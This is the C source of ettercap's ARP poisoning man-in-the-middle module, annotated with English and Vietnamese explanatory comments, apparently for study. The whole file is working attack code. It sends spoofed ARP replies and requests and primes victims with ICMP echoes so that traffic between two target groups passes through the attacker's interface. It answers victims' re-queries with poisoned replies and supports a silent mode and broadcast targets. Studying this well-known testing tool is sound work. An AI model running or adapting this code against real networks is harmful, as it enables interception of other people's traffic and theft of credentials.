/*
    ettercap -- ARP poisoning mitm module

    Copyright (C) ALoR & NaGA

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/

#include <ec.h>
#include <ec_mitm.h>
#include <ec_send.h>
#include <ec_threads.h>
#include <ec_hook.h>
#include <ec_ui.h>
#include <ec_sleep.h>

/* globals */

/* 
 * this are the two lists for poisoning.
 * each element in the each list is associated with all the element
 * in the other list. this is done in every case.
 * if one associtation has two equal element, it will be skipped.
 * this is done to permit overlapping groups
 */

/* these are LIST_HEAD (look in ec_mitm for the declaration) */
struct hosts_group arp_group_one;
struct hosts_group arp_group_two;

static int poison_oneway;

/* protos */

void arp_poisoning_init(void);
EC_THREAD_FUNC(arp_poisoner);
static int arp_poisoning_start(char *args);
static void arp_poisoning_stop(void);
static void arp_poisoning_confirm(struct packet_object *po);
static int create_silent_list(void);
static int create_list(void);

/*******************************************/

/*
 * this function is the initializer.
 * it adds the entry in the table of registered mitm
 */

void __init arp_poisoning_init(void)
{
   // set arp module as a man-in-the-middle in ettercap
   // struct mitm_method is in ec_mitm.h
   struct mitm_method mm;     // set name method as "mm"

   //
   mm.name = "arp";
   mm.start = &arp_poisoning_start;
   mm.stop = &arp_poisoning_stop;
   
   mitm_add(&mm);
}


/*
 * init the ARP POISONING attack
 */
static int arp_poisoning_start(char *args)
{
   struct hosts_list *g, *tmp;
   int ret;
   char *p;
  
   // a flag poison_oneway is set to 0
   // nhiệm vụ kiểm soát việc tấn công ARP poisoning một chiều hoặc hai chiều
   poison_oneway = 0; 

   //indicate the start of the function.     
   DEBUG_MSG("arp_poisoning_start");

   /* parse the args only if not empty */
   if (strcmp(args, "")) {
      for (p = strsep(&args, ","); p != NULL; p = strsep(&args, ",")) {
         // tham số là "remote", tùy chọn EC_GBL_OPTIONS->remote được đặt là 1, cho phép tấn công cả khi mục tiêu là máy cục bộ.
         if (!strcasecmp(p, "remote")) {
            /* 
            * allow sniffing of remote host even 
            * if the target is local (used for gw)
            */
            EC_GBL_OPTIONS->remote = 1;
         } 
         // tham số là "oneway", poison_oneway sẽ được đặt là 1, có nghĩa là tấn công ARP chỉ thực hiện một chiều (một hướng dữ liệu).
         else if (!strcasecmp(p, "oneway")) {
            poison_oneway = 1; 
         } 

         // tham số k hợp lệ
         else {
            SEMIFATAL_ERROR("ARP poisoning: parameter incorrect.\n");
         }
      }
   }

   /* arp poisoning only on etherenet */
   // This checks the type of data link being used. ARP poisoning is only supported for certain 
   //Ethernet (IL_TYPE_ETH)
   // Token Ring (IL_TYPE_TR)
   // FDDI (IL_TYPE_FDDI)
   if (EC_GBL_PCAP->dlt != IL_TYPE_ETH && EC_GBL_PCAP->dlt != IL_TYPE_TR && EC_GBL_PCAP->dlt != IL_TYPE_FDDI)
      SEMIFATAL_ERROR("ARP poisoning does not support this media.\n");  //If the network media type is not supported, a semi-fatal error is raised.

   
   /* we need the host list */
   // check host list if it is empty --> SEMFATAL_ERROR
   if (LIST_EMPTY(&EC_GBL_HOSTLIST))
      SEMIFATAL_ERROR("ARP poisoning needs a non empty hosts list.\n");
   
   /* xoá danh sách cũ*/
   //Before starting ARP poisoning, any existing ARP poisoning groups (two lists, arp_group_one and arp_group_two) 
   // are cleared. Each group is traversed, the items are removed from the list, 
   // and memory is freed.
   LIST_FOREACH_SAFE(g, &arp_group_one, next, tmp) {
      LIST_REMOVE(g, next);
      SAFE_FREE(g);
   }
   
   LIST_FOREACH_SAFE(g, &arp_group_two, next, tmp) {
      LIST_REMOVE(g, next);
      SAFE_FREE(g);
   }
   
   /* Tạo danh sách mục tiêu ARP poisoning */
   //tùy chọn "silent mode" và load_hosts không được bật, 
   //hàm sẽ gọi create_silent_list() để tạo danh sách mục tiêu trong chế độ im lặng.
   if (EC_GBL_OPTIONS->silent && !EC_GBL_OPTIONS->load_hosts)
      ret = create_silent_list();
   // Ngược lại, hàm sẽ gọi create_list() để tạo danh sách mục tiêu từ danh sách host hiện có.
   else
      ret = create_list();
   //Nếu không thể tạo danh sách (giá trị trả về khác E_SUCCESS), hàm sẽ báo lỗi và kết thúc.
   if (ret != E_SUCCESS)
      SEMIFATAL_ERROR("ARP poisoning process cannot start.\n");

   /* create a hook to look for ARP requests while poisoning */
   //confirm the poisoning by responding to ARP requests from poisoned hosts.
   // A hook is added to intercept ARP request packets (HOOK_PACKET_ARP_RQ)
   hook_add(HOOK_PACKET_ARP_RQ, &arp_poisoning_confirm);    //hook_add in ec_hook.c


   /* create the poisoning thread */
   // new thread is created to run the arp_poisoner function
   //handle the actual poisoning process in the background, continuously sending forged ARP packets to the target hosts.
   ec_thread_new("arp_poisoner", "ARP poisoning module", &arp_poisoner, NULL);

   // indicating that the ARP poisoning process has started successfully.
   return E_SUCCESS;
   
}


/*
 * shut down the poisoning process
 */
static void arp_poisoning_stop(void)
{
   int i;
   struct hosts_list *h;
   struct hosts_list *g1, *g2;
   pthread_t pid;
   
   DEBUG_MSG("arp_poisoning_stop");
   
   /* destroy the poisoner thread */
   pid = ec_thread_getpid("arp_poisoner");

   /* the thread is active or not ? */
   if (!pthread_equal(pid, ec_thread_getpid(NULL)))
      ec_thread_destroy(pid);
   else
      return;

   /* stop confirming ARP requests with poisoned answers */
   hook_del(HOOK_PACKET_ARP_RQ, &arp_poisoning_confirm);
        
   USER_MSG("ARP poisoner deactivated.\n");
 
   USER_MSG("RE-ARPing the victims...\n");
  
   ui_msg_flush(2);

   /* rearp the victims 3 time*/
   for (i = 0; i < 3; i++) {
      
      /* walk the lists and poison the victims */
      LIST_FOREACH(g1, &arp_group_one, next) {
         LIST_FOREACH(g2, &arp_group_two, next) {

            /* equal ip must be skipped */
            if (!ip_addr_cmp(&g1->ip, &g2->ip))
               continue;

            if (!EC_GBL_CONF->arp_poison_equal_mac)
               /* skip even equal mac address... */
               if (!memcmp(g1->mac, g2->mac, MEDIA_ADDR_LEN))
                  continue;
            
            /* the effective poisoning packets */
            if (EC_GBL_CONF->arp_poison_reply) {
               send_arp(ARPOP_REPLY, &g2->ip, g2->mac, &g1->ip, g1->mac); 
               /* only send from T2 to T1 */
               if (!poison_oneway)
                  send_arp(ARPOP_REPLY, &g1->ip, g1->mac, &g2->ip, g2->mac); 
            }
            if (EC_GBL_CONF->arp_poison_request) {
               send_arp(ARPOP_REQUEST, &g2->ip, g2->mac, &g1->ip, g1->mac); 
               /* only send from T2 to T1 */
               if (!poison_oneway)
                  send_arp(ARPOP_REQUEST, &g1->ip, g1->mac, &g2->ip, g2->mac); 
            }
           
            ec_usleep(MILLI2MICRO(EC_GBL_CONF->arp_storm_delay));
         }
      }
      
      /* sleep the correct delay, same as warm_up */
      ec_usleep(SEC2MICRO(EC_GBL_CONF->arp_poison_warm_up));
   }
   
   /* delete the elements in the first list */
   while (LIST_FIRST(&arp_group_one) != NULL) {
      h = LIST_FIRST(&arp_group_one);
      LIST_REMOVE(h, next);
      SAFE_FREE(h);
   }
   
   /* delete the elements in the second list */
   while (LIST_FIRST(&arp_group_two) != NULL) {
      h = LIST_FIRST(&arp_group_two);
      LIST_REMOVE(h, next);
      SAFE_FREE(h);
   }

   /* reset the remote flag */
   EC_GBL_OPTIONS->remote = 0;
}


/*
 * the real ARP POISONER thread
 */
EC_THREAD_FUNC(arp_poisoner)
{
   int i = 1;
   struct hosts_list *g1, *g2;

   /* variable not used */
   (void) EC_THREAD_PARAM;

   /* init the thread and wait for start up */
   ec_thread_init();
  
   /* never ending loop */
   LOOP {
      
      CANCELLATION_POINT();
      
      /* walk the lists and poison the victims */
      LIST_FOREACH(g1, &arp_group_one, next) {
         LIST_FOREACH(g2, &arp_group_two, next) {

            /* equal ip must be skipped, you cant poison itself */
            if (!ip_addr_cmp(&g1->ip, &g2->ip))
               continue;
           
            if (!EC_GBL_CONF->arp_poison_equal_mac)
               /* skip even equal mac address... */
               if (!memcmp(g1->mac, g2->mac, MEDIA_ADDR_LEN))
                  continue;
            
            /* 
             * send the spoofed ICMP echo request 
             * to force the arp entry in the cache
             */
            if (i == 1 && EC_GBL_CONF->arp_poison_icmp) {
               send_L2_icmp_echo(ICMP_ECHO, &g2->ip, &g1->ip, g1->mac);
               /* only send from T2 to T1 */
               if (!poison_oneway)
                  send_L2_icmp_echo(ICMP_ECHO, &g1->ip, &g2->ip, g2->mac);
            }
            
            /* the effective poisoning packets */
            if (EC_GBL_CONF->arp_poison_reply) {
               send_arp(ARPOP_REPLY, &g2->ip, EC_GBL_IFACE->mac, &g1->ip, g1->mac); 
               /* only send from T2 to T1 */
               if (!poison_oneway)
                  send_arp(ARPOP_REPLY, &g1->ip, EC_GBL_IFACE->mac, &g2->ip, g2->mac); 
            }
            /* request attack */
            if (EC_GBL_CONF->arp_poison_request) {
               send_arp(ARPOP_REQUEST, &g2->ip, EC_GBL_IFACE->mac, &g1->ip, g1->mac); 
               /* only send from T2 to T1 */
               if (!poison_oneway)
                  send_arp(ARPOP_REQUEST, &g1->ip, EC_GBL_IFACE->mac, &g2->ip, g2->mac); 
            }
          
            ec_usleep(MILLI2MICRO(EC_GBL_CONF->arp_storm_delay));
         }
      }
      
      /* if smart poisoning is enabled only poison initial and then only on request */
      if (EC_GBL_CONF->arp_poison_smart && i >= 3)
          return NULL;

      /* 
       * wait the correct delay:
       * for the first 5 time use the warm_up
       * then use normal delay
       */
      if (i < 5) {
         ec_usleep(SEC2MICRO(EC_GBL_CONF->arp_poison_warm_up));
         i++;
      } else {
         ec_usleep(SEC2MICRO(EC_GBL_CONF->arp_poison_delay));
      }
   }
   
   return NULL; 
}


/*
 * if a target wants to reconfirm the poisoned ARP information
 * it should be confirmed while poisoning
 */
static void arp_poisoning_confirm(struct packet_object *po)
{
   struct hosts_list *g1, *g2;
   char tmp[MAX_ASCII_ADDR_LEN];

   /* ignore ARP requests origined by ourself */
   if (!memcmp(po->L2.src, EC_GBL_IFACE->mac, MEDIA_ADDR_LEN)) 
      return;

   DEBUG_MSG("arp_poisoning_confirm(%s)", ip_addr_ntoa(&po->L3.dst, tmp));

   /* walk through the lists if ARP request was for a victim */
   LIST_FOREACH(g1, &arp_group_one, next) {
      /* if the sender is in group one ... */
      if (!ip_addr_cmp(&po->L3.src, &g1->ip)) {
         /* look if the target is in group two ... */
         LIST_FOREACH(g2, &arp_group_two, next) {
            if (!ip_addr_cmp(&po->L3.dst, &g2->ip)) {
               /* confirm the sender with the poisoned ARP reply */
               send_arp(ARPOP_REPLY, &po->L3.dst, EC_GBL_IFACE->mac, &po->L3.src, po->L2.src);
            }
         }
      }

      if (!poison_oneway) {
         /* else if the target is in group one ... */
         if (!ip_addr_cmp(&po->L3.dst, &g1->ip)) {
            /* look if the sender is in group two ... */
            LIST_FOREACH(g2, &arp_group_two, next) {
               if (!ip_addr_cmp(&po->L3.src, &g2->ip)) {
                  /* confirm the sender with the poisoned ARP reply */
                     send_arp(ARPOP_REPLY, &po->L3.dst, EC_GBL_IFACE->mac, &po->L3.src, po->L2.src);
               }
            }
         }
      }
   }
}


/*
 * create the list of victims
 * in silent mode only the first target is selected and you 
 * have to specify the mac address if you have specified an
 * ip address. you can also have an 'ANY' target and the 
 * arp poisoning will be broadcasted.
 * 
 * Hàm này nhằm mục đích chuẩn bị danh sách các mục tiêu 
 * cho cuộc tấn công ARP poisoning, kiểm tra tính hợp lệ của các mục tiêu 
 * và thêm chúng vào danh sách để thực hiện quá trình tấn công sau đó.
 */
static int create_silent_list(void)
{
   struct ip_list *i, *j;           //Con trỏ trỏ đến danh sách các địa chỉ IP của các mục tiêu (Target 1 và Target 2).
   struct hosts_list *h, *g;        //Con trỏ trỏ đến các danh sách của các hosts tương ứng với các mục tiêu.
   char tmp[MAX_ASCII_ADDR_LEN];
   char tmp2[MAX_ASCII_ADDR_LEN];
   
   DEBUG_MSG("create_silent_list");
  
   /* allocate the struct */
   /* cấp phát bộ nhớ cho cấu trúc host_list chứa thông tin về ip và mac cho mục tiêu*/
   SAFE_CALLOC(h, 1, sizeof(struct hosts_list));
   SAFE_CALLOC(g, 1, sizeof(struct hosts_list));
   
   USER_MSG("\nARP poisoning victims:\n\n");
   
/* examine the first target */
/* LIST_FIRST(&EC_GBL_TARGET1->ips lấy đia chỉ IP của mục tiêu 1*/
   if ((i = LIST_FIRST(&EC_GBL_TARGET1->ips)) != NULL) {
      
      /* the the ip was specified, even the mac address must be specified */
      if (!memcmp(EC_GBL_TARGET1->mac, "\x00\x00\x00\x00\x00\x00", MEDIA_ADDR_LEN) ) {
         USER_MSG("\nERROR: MAC address must be specified in silent mode.\n");
         //không có địa chỉ MAC cho mục tiêu 1, hàm sẽ báo lỗi và thoát với mã lỗi -E_FATAL.
         return -E_FATAL;
      }
      
      USER_MSG(" TARGET 1 : %-15s %17s\n", ip_addr_ntoa(&i->ip, tmp), mac_addr_ntoa(EC_GBL_TARGET1->mac, tmp2));
      
      /* copy the information */
      memcpy(&h->ip, &i->ip, sizeof(struct ip_addr));
      memcpy(&h->mac, &EC_GBL_TARGET1->mac, MEDIA_ADDR_LEN);
      
   } else {
      USER_MSG(" TARGET 1 : %-15s FF:FF:FF:FF:FF:FF\n", "ANY");
      
      /* set the broadcasts */
      memcpy(&h->ip, &EC_GBL_IFACE->network, sizeof(struct ip_addr));
      /* XXX - IPv6 compatible */
      /* the broadcast is the network address | ~netmask */
      *h->ip.addr32 |= ~(*EC_GBL_IFACE->netmask.addr32);

      /* broadcast mac address */
      memcpy(&h->mac, MEDIA_BROADCAST, MEDIA_ADDR_LEN);
   }
   
/* examine the second target */   
/* LIST_FIRST(&EC_GBL_TARGET2->ips lấy địa chỉ IP mục tiêu 2*/
   if ((j = LIST_FIRST(&EC_GBL_TARGET2->ips)) != NULL) {
      
      /* the the ip was specified, even the mac address must be specified */
      if (!memcmp(EC_GBL_TARGET2->mac, "\x00\x00\x00\x00\x00\x00", MEDIA_ADDR_LEN) ) {
         USER_MSG("\nERROR: MAC address must be specified in silent mode.\n");
         //không có địa chỉ MAC cho mục tiêu 2, hàm sẽ báo lỗi và thoát với mã lỗi -E_FATAL.
         return -E_FATAL;
      }
      USER_MSG(" TARGET 2 : %-15s %17s\n", ip_addr_ntoa(&j->ip, tmp), mac_addr_ntoa(EC_GBL_TARGET2->mac, tmp2));
      
      /* copy the information */
      memcpy(&g->ip, &j->ip, sizeof(struct ip_addr));
      memcpy(&g->mac, &EC_GBL_TARGET2->mac, MEDIA_ADDR_LEN);
      
   } else {
      USER_MSG(" TARGET 2 : %-15s FF:FF:FF:FF:FF:FF\n", "ANY");
      
      /* set the broadcasts */
      memcpy(&g->ip, &EC_GBL_IFACE->network, sizeof(struct ip_addr));
      /* XXX - IPv6 compatible */
      /* the broadcast is the network address | ~netmask */
      *g->ip.addr32 |= ~(*EC_GBL_IFACE->netmask.addr32);

      /* broadcast mac address */
      memcpy(&g->mac, MEDIA_BROADCAST, MEDIA_ADDR_LEN);
   }

// Hàm kiểm tra xem hai mục tiêu có khác nhau không và kiểm tra xem cả hai địa chỉ IP đều phải thuộc giao thức IPv4 (AF_INET).
// Nếu các điều kiện này không thỏa mãn, hàm sẽ báo lỗi và giải phóng bộ nhớ đã cấp phát.
   if (i == j || 
       ntohs(i->ip.addr_type) != AF_INET || 
       ntohs(j->ip.addr_type) != AF_INET) 
   {
      USER_MSG("\nERROR: Cannot ARP poison these targets...\n");
      SAFE_FREE(h);     // giải phóng bộ nhớ
      SAFE_FREE(g);     // giải phóng bộ nhớ
      return -E_FATAL;
   }

   /* add the elements in the two lists */
   //Nếu không có lỗi, hai mục tiêu sẽ được thêm vào hai danh sách arp_group_one và arp_group_two để xử lý tiếp theo.
   LIST_INSERT_HEAD(&arp_group_one, h, next);
   LIST_INSERT_HEAD(&arp_group_two, g, next);

   return E_SUCCESS;
}


/*
 * create the list of multiple victims.
 * the list is joined with the hosts list created with the
 * initial arp scan because we need to know the mac address
 * of the victims
 */
static int create_list(void)
{
   struct ip_list *i;
   struct hosts_list *h, *g;
   char tmp[MAX_ASCII_ADDR_LEN];
   char tmp2[MAX_ASCII_ADDR_LEN];

   DEBUG_MSG("create_list");
   
   USER_MSG("\nARP poisoning victims:\n\n");
  
/* the first group */
   LIST_FOREACH(i, &EC_GBL_TARGET1->ips, next) {
      LIST_FOREACH(h, &EC_GBL_HOSTLIST, next) {
         if (!ip_addr_cmp(&i->ip, &h->ip)) {
            USER_MSG(" GROUP 1 : %s %s\n", ip_addr_ntoa(&h->ip, tmp), mac_addr_ntoa(h->mac, tmp2));

            /* create the element and insert it in the list */
            SAFE_CALLOC(g, 1, sizeof(struct hosts_list));
            
            memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
            memcpy(&g->mac, &h->mac, MEDIA_ADDR_LEN);
            
            LIST_INSERT_HEAD(&arp_group_one, g, next);
         }
      }
   }
   
   /* the target is NULL. convert to ANY (all the hosts) */
   if (LIST_FIRST(&EC_GBL_TARGET1->ips) == NULL) {

      USER_MSG(" GROUP 1 : ANY (all the hosts in the list)\n");
      
      /* add them */ 
      LIST_FOREACH(h, &EC_GBL_HOSTLIST, next) {
         /* only IPv4 */
         if (ntohs(h->ip.addr_type) != AF_INET)
            continue;
           
         /* create the element and insert it in the list */
         SAFE_CALLOC(g, 1, sizeof(struct hosts_list));

         memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
         memcpy(&g->mac, &h->mac, MEDIA_ADDR_LEN);
           
         LIST_INSERT_HEAD(&arp_group_one, g, next);
      }
   }

   USER_MSG("\n");
   
/* the second group */

   /* if the target was specified */
   LIST_FOREACH(i, &EC_GBL_TARGET2->ips, next) {
      LIST_FOREACH(h, &EC_GBL_HOSTLIST, next) {
         if (!ip_addr_cmp(&i->ip, &h->ip)) {
            USER_MSG(" GROUP 2 : %s %s\n", ip_addr_ntoa(&h->ip, tmp), mac_addr_ntoa(h->mac, tmp2));
            
            /* create the element and insert it in the list */
            SAFE_CALLOC(g, 1, sizeof(struct hosts_list));
            
            memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
            memcpy(&g->mac, &h->mac, MEDIA_ADDR_LEN);
            
            LIST_INSERT_HEAD(&arp_group_two, g, next);
         }
      }
   }
   
   /* the target is NULL. convert to ANY (all the hosts) */
   if (LIST_FIRST(&EC_GBL_TARGET2->ips) == NULL) {

      USER_MSG(" GROUP 2 : ANY (all the hosts in the list)\n");
      
      /* add them */ 
      LIST_FOREACH(h, &EC_GBL_HOSTLIST, next) {
         /* only IPv4 */
         if (ntohs(h->ip.addr_type) != AF_INET)
            continue;
           
         /* create the element and insert it in the list */
         SAFE_CALLOC(g, 1, sizeof(struct hosts_list));

         memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
         memcpy(&g->mac, &h->mac, MEDIA_ADDR_LEN);
           
         LIST_INSERT_HEAD(&arp_group_two, g, next);
      }
   }
   
   return E_SUCCESS;
}

/* EOF */

// vim:ts=3:expandtab

